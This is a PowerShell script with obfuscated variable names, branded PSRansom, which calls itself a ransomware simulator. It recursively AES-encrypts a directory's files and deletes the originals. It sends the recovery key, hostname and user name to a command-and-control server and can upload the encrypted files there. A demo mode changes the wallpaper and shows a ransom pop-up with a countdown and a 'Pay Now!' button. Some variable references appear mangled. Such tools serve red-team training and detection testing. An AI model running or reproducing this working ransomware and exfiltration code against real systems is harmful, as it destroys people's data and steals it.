





$ProgressPreference = "SilentlyContinue"
$ErrorActionPreference = "SilentlyContinue"
$vLykPxYICdsXE0 = [Environment]::OSVersion.Platform
if ($vLykPxYICdsXE0 -like "*Win*") {
$Host.UI.RawUI.WindowTitle = "PSRansom - by @JoelGMSec" 
$Host.UI.RawUI.BackgroundColor = "Black"
$Host.UI.RawUI.ForegroundColor = "White" }


function Show-Banner {
   Write-Host 
   Write-Host "  ____  ____  ____                                  " -ForegroundColor Blue
   Write-Host " |  _ \/ ___||  _ \ __ _ _ __  ___  ___  _ __ ___   " -ForegroundColor Blue
   Write-Host " | |_) \___ \| |_) / _' | '_ \/ __|/ _ \| '_ ' _ \  " -ForegroundColor Blue
   Write-Host " |  __/ ___) |  _ < (_| | | | \__ \ (_) | | | | | | " -ForegroundColor Blue
   Write-Host " |_|   |____/|_| \_\__,_|_| |_|___/\___/|_| |_| |_| " -ForegroundColor Blue
   Write-Host                                                            
   Write-Host "  ----------------- by @JoelGMSec ----------------  " -ForegroundColor Green }


function Show-Help {
   Write-host ; Write-Host " Info: " -ForegroundColor Yellow -NoNewLine ; Write-Host " This tool helps you simulate encryption process of a"
   Write-Host "        generic ransomware in PowerShell with C2 capabilities"
   Write-Host ; Write-Host " Usage: " -ForegroundColor Yellow -NoNewLine ; Write-Host ".\PSRansom.ps1 -e Directory -s C2Server -p C2Port" -ForegroundColor Blue 
   Write-Host "          Encrypt all files & sends recovery key to C2Server" -ForegroundColor Green
   Write-Host "          Use -x to exfiltrate and decrypt files on C2Server" -ForegroundColor Green
   Write-Host ; Write-Host "        .\PSRansom.ps1 -d Directory -k RecoveryKey" -ForegroundColor Blue 
   Write-Host "          Decrypt all files with recovery key string" -ForegroundColor Green
   Write-Host ; Write-Host " Warning: " -ForegroundColor Red -NoNewLine  ; Write-Host "All info will be sent to the C2Server without any encryption"
   Write-Host "         " -NoNewLine ; Write-Host " You need previously generated recovery key to retrieve files" ; Write-Host }


$lCoeB7DVjj8DiYSI9aLoqVH9n = $args[0]
$TBCFlQOP = $args[1]
$PSRKeyxJ = $args[3]
$rlLXa = $args[3]
$7Q1mgbk = $args[5]
$ixWb = $args[6]
$6KbxF3XcDM = $null


if ($args[0] -like "-h*") { Show-Banner ; Show-Help ; break }
if ($args[0] -eq $null) { Show-Banner ; Show-Help ; Write-Host "[!] Not enough parameters!" -ForegroundColor Red ; Write-Host ; break }
if ($args[1] -eq $null) { Show-Banner ; Show-Help ; Write-Host "[!] Not enough parameters!" -ForegroundColor Red ; Write-Host ; break }
if ($args[2] -eq $null) { Show-Banner ; Show-Help ; Write-Host "[!] Not enough parameters!" -ForegroundColor Red ; Write-Host ; break }
if ($args[3] -eq $null) { Show-Banner ; Show-Help ; Write-Host "[!] Not enough parameters!" -ForegroundColor Red ; Write-Host ; break }


[System.Net.WebRequest]::DefaultWebProxy = [System.Net.WebRequest]::GetSystemWebProxy()
[System.Net.WebRequest]::DefaultWebProxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials
$6kWnOQBiEPUxfKIRAemcguNS = [System.Net.SecurityProtocolType]"Ssl3,Tls,Tls11,Tls12" ; [System.Net.ServicePointManager]::SecurityProtocol = $6kWnOQBiEPUxfKIRAemcguNS


$IcGzEvB5 = ([Environment]::MachineName).ToLower() ; $bFSEAcuN63ri4 = ([Environment]::UserName).ToLower() ; $dbrjVaxek8Hp9Ujs = "readme.txt"
$qsvHCrdbE1F6XuQ5V8cSLWY = Get-Date -Format "HH:mm - dd/MM/yy" ; $XSUGTsbcm9FDHgZ76Pdrin3q = $qsvHCrdbE1F6XuQ5V8cSLWY.replace(":","").replace(" ","").replace("-","").replace("/","")+$IcGzEvB5
if ($vLykPxYICdsXE0 -like "*Win*") { $laXlS7ODJIh = (([Environment]::UserDomainName).ToLower()+"\") ; $Z6isiKUYx6 = "\" } else { $laXlS7ODJIh = $null ; $Z6isiKUYx6 = "/" } 
$Icg7ZaGdR1JzwVFAU8KXsqHo = $TBCFlQOP.Split($Z6isiKUYx6)[-1] ; if (!$Icg7ZaGdR1JzwVFAU8KXsqHo) { $Icg7ZaGdR1JzwVFAU8KXsqHo = $TBCFlQOP.Path.Split($Z6isiKUYx6)[-1] }

function Invoke-AESEncryption {
   [CmdletBinding()]
   [OutputType([string])]
   Param(
       [Parameter(Mandatory = $true)]
       [ValidateSet("Encrypt", "Decrypt")]
       [String]$lCoeB7DVjj8DiYSI9aLoqVH9n,

       [Parameter(Mandatory = $true)]
       [String]$4ZaRk7y5ExLjNe8ViW9,

       [Parameter(Mandatory = $true, ParameterSetName = "CryptText")]
       [String]$EHwBCN631FWgcUXkjArRlTfe,

       [Parameter(Mandatory = $true, ParameterSetName = "CryptFile")]
       [String]$EdVlvoReItgSUXP4MG)

   Begin {
      $41NUMBGFLtWCVb = New-Object System.Security.Cryptography.SHA256Managed
      $BsUI = New-Object System.Security.Cryptography.AesManaged
      $BsUI.Mode = [System.Security.Cryptography.CipherMode]::CBC
      $BsUI.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
      $BsUI.BlockSize = 128
      $BsUI.KeySize = 256 }

   Process {
      $BsUI.Key = $41NUMBGFLtWCVb.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($4ZaRk7y5ExLjNe8ViW9))
      switch ($lCoeB7DVjj8DiYSI9aLoqVH9n) {

         "Encrypt" {
             if ($EHwBCN631FWgcUXkjArRlTfe) {$PiwIdSRoBK50hHEx = [System.Text.Encoding]::UTF8.GetBytes($EHwBCN631FWgcUXkjArRlTfe)}

             if ($EdVlvoReItgSUXP4MG) {
                $BDAR = Get-Item -Path $EdVlvoReItgSUXP4MG -ErrorAction SilentlyContinue
                if (!$BDAR.FullName) { break }
                $PiwIdSRoBK50hHEx = [System.IO.File]::ReadAllBytes($BDAR.FullName)
                $cirb = $BDAR.FullName + ".psr" }

             $xelw7T41WzYPQRfhdk9 = $BsUI.CreateEncryptor()
             $1DMjBopPYqX7Tt9eGzk4Om20b = $xelw7T41WzYPQRfhdk9.TransformFinalBlock($PiwIdSRoBK50hHEx, 0, $PiwIdSRoBK50hHEx.Length)
             $1DMjBopPYqX7Tt9eGzk4Om20b = $BsUI.IV + $1DMjBopPYqX7Tt9eGzk4Om20b
             $BsUI.Dispose()

             if ($EHwBCN631FWgcUXkjArRlTfe) {return [System.Convert]::ToBase64String($1DMjBopPYqX7Tt9eGzk4Om20b)}
             if ($EdVlvoReItgSUXP4MG) {
                [System.IO.File]::WriteAllBytes($cirb, $1DMjBopPYqX7Tt9eGzk4Om20b)
                (Get-Item $cirb).LastWriteTime = $BDAR.LastWriteTime }}

         "Decrypt" {
             if ($EHwBCN631FWgcUXkjArRlTfe) {$B = [System.Convert]::FromBase64String($EHwBCN631FWgcUXkjArRlTfe)}

             if ($EdVlvoReItgSUXP4MG) {
                $BDAR = Get-Item -Path $EdVlvoReItgSUXP4MG -ErrorAction SilentlyContinue
                if (!$BDAR.FullName) { break }
                $B = [System.IO.File]::ReadAllBytes($BDAR.FullName)
                $cirb = $BDAR.FullName.replace(".psr","") }

             $BsUI.IV = $B[0..15]
             $1kEzrpGj5hfvPX7xdqWuiYme = $BsUI.CreateDecryptor()
             $EjRe0gTQP = $1kEzrpGj5hfvPX7xdqWuiYme.TransformFinalBlock($B, 16, $B.Length - 16)
             $BsUI.Dispose()

             if ($EHwBCN631FWgcUXkjArRlTfe) {return [System.Text.Encoding]::UTF8.GetString($EjRe0gTQP).Trim([char]0)}
             if ($EdVlvoReItgSUXP4MG) {
                [System.IO.File]::WriteAllBytes($cirb, $EjRe0gTQP)
                (Get-Item $cirb).LastWriteTime = $BDAR.LastWriteTime }}}}

  End {
      $41NUMBGFLtWCVb.Dispose()
      $BsUI.Dispose()}}

function RemoveWallpaper {
$l4PNLMxXQw76Vi05kGy = @"
using System;
using System.Drawing;
using System.Runtime.InteropServices;
using Microsoft.Win32;
 
namespace CurrentUser { public class Desktop {
[DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Auto)]
private static extern int SystemParametersInfo(int uAction, int uParm, string lpvParam, int fuWinIni);
[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
private static extern int SetSysColors(int cElements, int[] lpaElements, int[] lpRgbValues);
public const int UpdateIniFile = 0x01; public const int SendWinIniChange = 0x02;
public const int SetDesktopBackground = 0x0014; public const int COLOR_DESKTOP = 1;
public int[] first = {COLOR_DESKTOP};

public static void RemoveWallPaper(){
SystemParametersInfo( SetDesktopBackground, 0, "", SendWinIniChange | UpdateIniFile );
RegistryKey regkey = Registry.CurrentUser.OpenSubKey("Control Panel\\Desktop", true);
regkey.SetValue(@"WallPaper", 0); regkey.Close();}

public static void SetBackground(byte r, byte g, byte b){ int[] elements = {COLOR_DESKTOP};

RemoveWallPaper();
System.Drawing.Color color = System.Drawing.Color.FromArgb(r,g,b);
int[] colors = { System.Drawing.ColorTranslator.ToWin32(color) };

SetSysColors(elements.Length, elements, colors);
RegistryKey key = Registry.CurrentUser.OpenSubKey("Control Panel\\Colors", true);
key.SetValue(@"Background", string.Format("{0} {1} {2}", color.R, color.G, color.B));
key.Close();}}}
 
"@
try { Add-Type -TypeDefinition $l4PNLMxXQw76Vi05kGy -ReferencedAssemblies System.Drawing.dll }
finally {[CurrentUser.Desktop]::SetBackground(250, 25, 50)}}

function PopUpRansom {
[void] [System.Reflection.Assembly]::LoadWithPartialName("System.Drawing")  
[void] [System.Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms") 
[void] [System.Windows.Forms.Application]::EnableVisualStyles() 

Invoke-WebRequest -useb https://raw.githubusercontent.com/JoelGMSec/PSRansom/main/Demo/PSRansom.jpg -Outfile $v1X267RGf:temp\PSRansom.jpg
Invoke-WebRequest -useb https://raw.githubusercontent.com/JoelGMSec/PSRansom/main/Demo/PSRansom.ico -Outfile $v1X267RGf:temp\PSRansom.ico
$jxi87mLlc2KzlvD48W0qSH3 = New-Object -ComObject "Shell.Application"
$jxi87mLlc2KzlvD48W0qSH3.minimizeall()

$uT66poBQCaxtVmAM = New-Object system.Windows.Forms.Form
$uT66poBQCaxtVmAM.ControlBox = $false;
$uT66poBQCaxtVmAM.Size = New-Object System.Drawing.Size(900,600) 
$uT66poBQCaxtVmAM.BackColor = "Black" 
$uT66poBQCaxtVmAM.MaximizeBox = $false 
$uT66poBQCaxtVmAM.StartPosition = "CenterScreen" 
$uT66poBQCaxtVmAM.WindowState = "Normal"
$uT66poBQCaxtVmAM.Topmost = $true
$uT66poBQCaxtVmAM.FormBorderStyle = "Fixed3D"
$uT66poBQCaxtVmAM.Text = "PSRansom by @JoelGMSec - https://github.com/JoelGMSec/PSRansom"
$sNaFb3Fh = New-Object system.drawing.icon ("$v1X267RGf:temp\PSRansom.ico") 
$uT66poBQCaxtVmAM.Icon = $sNaFb3Fh  

$MRWJOPDEl4 = [System.Drawing.Image]::Fromfile("$v1X267RGf:temp\PSRansom.jpg")
$wlGrv = new-object Windows.Forms.PictureBox
$wlGrv.Width = 920
$wlGrv.Height = 370
$wlGrv.SizeMode = "StretchImage"
$wlGrv.Image = $MRWJOPDEl4
$uT66poBQCaxtVmAM.controls.add($wlGrv)

$A9u0ym = New-Object System.Windows.Forms.Label
$A9u0ym.ForeColor = "Cyan"
$A9u0ym.Text = "All your files have been encrypted by PSRansom!" 
$A9u0ym.AutoSize = $true 
$A9u0ym.Location = New-Object System.Drawing.Size(50,400) 
$GezLXTa8H4WYL = New-Object System.Drawing.Font("Consolas",15,[System.Drawing.FontStyle]::Bold) 
$uT66poBQCaxtVmAM.Font = $GezLXTa8H4WYL 
$uT66poBQCaxtVmAM.Controls.Add($A9u0ym) 

$DrkdAgHZ5Yf2GtX4 = New-Object System.Windows.Forms.Label
$DrkdAgHZ5Yf2GtX4.ForeColor = "White"
$DrkdAgHZ5Yf2GtX4.Text = "But don't worry, you can still recover them with the recovery key :)" 
$DrkdAgHZ5Yf2GtX4.AutoSize = $true 
$DrkdAgHZ5Yf2GtX4.Location = New-Object System.Drawing.Size(50,450)
$S7 = New-Object System.Drawing.Font("Consolas",15,[System.Drawing.FontStyle]::Bold) 
$uT66poBQCaxtVmAM.Font = $S7
$uT66poBQCaxtVmAM.Controls.Add($DrkdAgHZ5Yf2GtX4) 

$1fCYpAiWx = New-Object System.Windows.Forms.Button;
$1fCYpAiWx.Location = New-Object System.Drawing.Point(750,500)
$1fCYpAiWx.Size = New-Object System.Drawing.Size(110,35)
$1fCYpAiWx.ForeColor = "Black"
$1fCYpAiWx.BackColor = "White"
$1fCYpAiWx.FlatStyle = [System.Windows.Forms.FlatStyle]::Flat
$1fCYpAiWx.Text = 'Pay Now!'
$1fCYpAiWx.Visible = $false
$1fCYpAiWx.Enabled = $true
$1fCYpAiWx.DialogResult = [System.Windows.Forms.DialogResult]::OK
$1fCYpAiWx.add_Click({ 
[System.Windows.Forms.MessageBox]::Show($HsbVjxQ1iwy.ActiveForm, 'Your payment order has been registered!', 'PSRansom Payment System',
[Windows.Forms.MessageBoxButtons]::"OK", [Windows.Forms.MessageBoxIcon]::"Warning")})
$uT66poBQCaxtVmAM.AcceptButton = $1fCYpAiWx
$uT66poBQCaxtVmAM.Controls.Add($1fCYpAiWx)
$uT66poBQCaxtVmAM.Activate() 2>&1> $null
$uT66poBQCaxtVmAM.Focus() 2>&1> $null

$oWYJGqEwgSxL9RIF38A2U=New-Object System.Windows.Forms.Label
$oWYJGqEwgSxL9RIF38A2U.Location = New-Object System.Drawing.Point(50,500)
$oWYJGqEwgSxL9RIF38A2U.Width = 500
$uT66poBQCaxtVmAM.Controls.Add($oWYJGqEwgSxL9RIF38A2U)
$oWYJGqEwgSxL9RIF38A2U.ForeColor = "Red"
$lagp = [DateTime]::Now
$7NV0y8Ek = 10.6
$ZsMa5bfLEB3mGuFeiPW=New-Object System.Windows.Forms.Timer
$ZsMa5bfLEB3mGuFeiPW.add_Tick({$ucLPqs1hWr = ([DateTime]::Now - $lagp).TotalSeconds ; $UEh = $7NV0y8Ek - $ucLPqs1hWr
if ($UEh -like "-0.1*"){ $ZsMa5bfLEB3mGuFeiPW.Stop() ; $1fCYpAiWx.Visible = $true ; $oWYJGqEwgSxL9RIF38A2U.Text = "0 Seconds remaining.." }
$oWYJGqEwgSxL9RIF38A2U.Text = [String]::Format("{0} Seconds remaining..", [math]::round($UEh))})
$ZsMa5bfLEB3mGuFeiPW.Start()

$GP6hotnwjdyZNM9vi0ulULgXS = $uT66poBQCaxtVmAM.ShowDialog()
if ($GP6hotnwjdyZNM9vi0ulULgXS -like "OK"){ $9vinqf42tym7teS:PayNow = "True" }}
Remove-Item $v1X267RGf:temp\PSRansom* -force

function R64Encoder { 
   if ($args[0] -eq "-t") { $VZ0iEu = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($args[1])) }
   if ($args[0] -eq "-f") { $VZ0iEu = [Convert]::ToBase64String([IO.File]::ReadAllBytes($args[1])) }
   $VZ0iEu = $VZ0iEu.Split("=")[0] ; $VZ0iEu = $VZ0iEu.Replace("+", "-") ; $VZ0iEu = $VZ0iEu.Replace("/", "_")
   $3ML6KIWwoprea = $VZ0iEu.ToCharArray() ; [array]::Reverse($3ML6KIWwoprea) ; $cum4jpgsYiP2 = -join $3ML6KIWwoprea ; return $cum4jpgsYiP2 }

function ShowInfo {
   Write-Host ; Write-Host "[>] Hostname: " -NoNewLine -ForegroundColor Yellow ; Write-Host $IcGzEvB5
   Write-Host "[>] Current User: " -NoNewLine -ForegroundColor Yellow ; Write-Host $laXlS7ODJIh$bFSEAcuN63ri4
   Write-Host "[>] Current Time: " -NoNewLine -ForegroundColor Yellow ; Write-Host $qsvHCrdbE1F6XuQ5V8cSLWY }

function GetStatus {
   Try { Invoke-WebRequest -useb "$rlLXa`:$7Q1mgbk/status" -Method GET 
      Write-Host "[i] Command & Control Server is up!" -ForegroundColor Green }
   Catch { Write-Host "[!] Command & Control Server is down!" -ForegroundColor Red }}

function SendResults {
   $N = Invoke-AESEncryption -Mode Encrypt -Key $XSUGTsbcm9FDHgZ76Pdrin3q -Text $PSRKeyxJ ; $Igz4nhN5h = R64Encoder -t $N
   $AYVKd6aEt4lMC1iu0GxBOpI2n = " [>] Key: $Igz4nhN5h [>] Hostname: $IcGzEvB5 [>] Current User: $laXlS7ODJIh$bFSEAcuN63ri4 [>] Current Time: $qsvHCrdbE1F6XuQ5V8cSLWY"
   $MImqR4Wfy1EC5 = Get-Content "$TBCFlQOP$Z6isiKUYx6$dbrjVaxek8Hp9Ujs" | Select-String "[!]" | Select-String "PSRansom!" -NotMatch
   $Hn0hwWIt4TCpzig = R64Encoder -t $AYVKd6aEt4lMC1iu0GxBOpI2n ; $YTv6664pH8aLhz5emnvvKU = R64Encoder -t $MImqR4Wfy1EC5
   Invoke-WebRequest -useb "$rlLXa`:$7Q1mgbk/data" -Method POST -Body $Hn0hwWIt4TCpzig 2>&1> $null
   Invoke-WebRequest -useb "$rlLXa`:$7Q1mgbk/logs" -Method POST -Body $YTv6664pH8aLhz5emnvvKU 2>&1> $null }

function SendClose {
   Invoke-WebRequest -useb "$rlLXa`:$7Q1mgbk/close" -Method GET 2>&1> $null }

function SendPay {
   Invoke-WebRequest -useb "$rlLXa`:$7Q1mgbk/pay" -Method GET 2>&1> $null }

function SendOK {
   Invoke-WebRequest -useb "$rlLXa`:$7Q1mgbk/done" -Method GET 2>&1> $null }

function CreateReadme {
   $Cx9vwHB56PfQGZ8Rs = "All your files have been encrypted by PSRansom!`nBut don't worry, you can still recover them with the recovery key :)`n"
   if (!(Test-Path "$TBCFlQOP$Z6isiKUYx6$dbrjVaxek8Hp9Ujs")) { Add-Content -Path "$TBCFlQOP$Z6isiKUYx6$dbrjVaxek8Hp9Ujs" -Value $Cx9vwHB56PfQGZ8Rs 
   Add-Content -Path "$TBCFlQOP$Z6isiKUYx6$dbrjVaxek8Hp9Ujs" -Value "Recovery Key: $PSRKeyxJ `n" }}

function EncryptFiles { 
   $x2i3HdwnNPy6kSb = '*.psr', 'readme.txt', '*.dll', '*.ini', '*.sys', '*.exe', '*.msi', '*.NLS', '*.acm', '*.nls', '*.EXE', '*.dat', '*.efi', '*.mui'
   foreach ($v1X267RGf in $(Get-ChildItem $TBCFlQOP -recurse -exclude $x2i3HdwnNPy6kSb | Where-Object { ! $_.PSIsContainer } | ForEach-Object { $_.FullName })) { 
   Invoke-AESEncryption -Mode Encrypt -Key $PSRKeyxJ -Path $v1X267RGf ; Add-Content -Path "$TBCFlQOP$Z6isiKUYx6$dbrjVaxek8Hp9Ujs" -Value "[!] $v1X267RGf is now encrypted" ; Remove-Item $v1X267RGf }
   $MImqR4Wfy1EC5 = Get-Content "$TBCFlQOP$Z6isiKUYx6$dbrjVaxek8Hp9Ujs" | Select-String "[!]" | Select-String "PSRansom!" -NotMatch ; if (!$MImqR4Wfy1EC5) { 
   Add-Content -Path "$TBCFlQOP$Z6isiKUYx6$dbrjVaxek8Hp9Ujs" -Value "[!] No files have been encrypted!" }}

function ExfiltrateFiles {
   Invoke-WebRequest -useb "$rlLXa`:$7Q1mgbk/files" -Method GET 2>&1> $null 
   $MImqR4Wfy1EC5 = Get-Content "$TBCFlQOP$Z6isiKUYx6$dbrjVaxek8Hp9Ujs" | Select-String "No files have been encrypted!" ; if (!$MImqR4Wfy1EC5) {
   foreach ($v1X267RGf in $(Get-ChildItem $TBCFlQOP -recurse -filter *.psr | Where-Object { ! $_.PSIsContainer } | ForEach-Object { $_.FullName })) {
      $wfTe41x3PhFrR0CmVG5dg = $v1X267RGf.split($Z6isiKUYx6)[-1] ; $Fd8usvSQa0eJHtCfiR = R64Encoder -f $v1X267RGf ; $qeyFH9vsmaI6i = R64Encoder -t $wfTe41x3PhFrR0CmVG5dg
      Invoke-WebRequest -useb "$rlLXa`:$7Q1mgbk/files/$qeyFH9vsmaI6i" -Method POST -Body $Fd8usvSQa0eJHtCfiR 2>&1> $null }}
   else { $qeyFH9vsmaI6i = R64Encoder -t "none.null" ; Invoke-WebRequest -useb "$rlLXa`:$7Q1mgbk/files/$qeyFH9vsmaI6i" -Method POST -Body $Fd8usvSQa0eJHtCfiR 2>&1> $null }}

function DecryptFiles {
   foreach ($v1X267RGf in $(Get-ChildItem $TBCFlQOP -recurse -filter *.psr | Where-Object { ! $_.PSIsContainer } | ForEach-Object { $_.FullName })) {
      Invoke-AESEncryption -Mode Decrypt -Key $PSRKeyxJ -Path $v1X267RGf ; $qehRGoVWKyZj = $v1X267RGf.replace(".psr","")
      Write-Host "[+] $qehRGoVWKyZj is now decrypted" -ForegroundColor Blue } ; Remove-Item "$TBCFlQOP$Z6isiKUYx6$dbrjVaxek8Hp9Ujs" }

function CheckFiles { 
   $HwdjkbfIP72XZnqFyNi4JAx = Get-ChildItem $TBCFlQOP -recurse -filter *.psr ; if ($HwdjkbfIP72XZnqFyNi4JAx) { $HwdjkbfIP72XZnqFyNi4JAx | Remove-Item } else {
   Write-Host "[!] No encrypted files has been found!" -ForegroundColor Red }}


Show-Banner ; ShowInfo

if ($lCoeB7DVjj8DiYSI9aLoqVH9n -eq "-d") { 
   Write-Host ; Write-Host "[!] Recovering ransomware infection on $Icg7ZaGdR1JzwVFAU8KXsqHo directory.." -ForegroundColor Red
   Write-Host "[i] Applying recovery key on encrypted files.." -ForegroundColor Green
   DecryptFiles ; CheckFiles ; sleep 1 }
 
else {
   Write-Host ; Write-Host "[!] Simulating ransomware infection on $Icg7ZaGdR1JzwVFAU8KXsqHo directory.." -ForegroundColor Red
   Write-Host "[+] Checking communication with Command & Control Server.." -ForegroundColor Blue
   $6KbxF3XcDM = GetStatus ; sleep 1

   Write-Host "[+] Generating new random string key for encryption.." -ForegroundColor Blue
   $PSRKeyxJ = -join ( (48..57) + (65..90) + (97..122) | Get-Random -Count 24 | % {[char]$_})

   Write-Host "[!] Encrypting all files with 256 bits AES key.." -ForegroundColor Red
   CreateReadme ; EncryptFiles ; if ($6KbxF3XcDM) { SendResults ; sleep 1

   if ($ixWb -eq "-x") { Write-Host "[i] Exfiltrating files to Command & Control Server.." -ForegroundColor Green
      ExfiltrateFiles ; sleep 1 }}

   if (!$6KbxF3XcDM) { Write-Host "[+] Saving logs and key in readme.txt.." -ForegroundColor Blue }
   else { Write-Host "[+] Sending logs and key to Command & Control Server.." -ForegroundColor Blue }}

   if ($args -like "-demo") { RemoveWallpaper ; PopUpRansom
   if ($qBxzJrkR4KLa51ZbjmlIGAv -eq "True") { SendPay ; SendOK } else { SendClose ; SendOK }}
   else { SendOK }

sleep 1 ; Write-Host "[i] Done!" -ForegroundColor Green ; Write-Host

